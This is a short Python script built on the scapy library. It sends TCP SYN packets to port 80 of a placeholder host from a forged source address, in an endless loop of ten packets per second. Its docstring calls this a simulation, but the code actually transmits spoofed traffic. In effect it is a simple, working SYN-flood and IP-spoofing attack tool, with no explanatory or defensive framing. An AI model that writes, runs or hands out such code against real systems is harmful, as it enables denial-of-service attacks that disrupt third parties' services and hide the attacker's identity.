import time
from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send

def send_packets():
    """
    Simulate sending packets to a target IP address from a spoofed source IP.
    """
    target_ip = "www.example.com"
    spoofed_ip = "192.168.1.100"
    target_port = 80
    while True:
        packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packet, count=10)  # Send 10 packets
        time.sleep(1)


if __name__ == "__main__":
    send_packets()

